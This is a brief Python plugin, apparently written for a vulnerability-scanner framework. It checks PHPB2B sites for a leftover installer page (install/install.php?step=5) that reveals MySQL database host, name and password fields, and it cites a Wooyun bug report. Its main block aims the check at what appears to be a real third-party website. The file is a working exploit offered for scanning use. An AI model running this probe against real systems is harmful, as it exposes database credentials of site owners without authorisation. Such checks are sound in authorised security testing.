#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: PHPB2B某处漏洞直接查看mysql密码
#Refer:http://www.wooyun.org/bugs/wooyun-2015-090306
#Author:xq17
def assign(service, arg):
    if service == "phpb2b":
        return True, arg

def audit(arg):
    payload = arg + "install/install.php?step=5&app_lang=zh-cn&do=complete"
    code, head, res, errcode, _ = curl.curl2(payload)
    if code ==200 and 'name="dbname"' in res and 'name="dbhost"' in res:
         security_info(payload+':Infromation Traversal dbw =value' )
         
if __name__ == '__main__':
        from dummy import *
        audit(assign('phpb2b', 'http://en.csjci.com/')[1])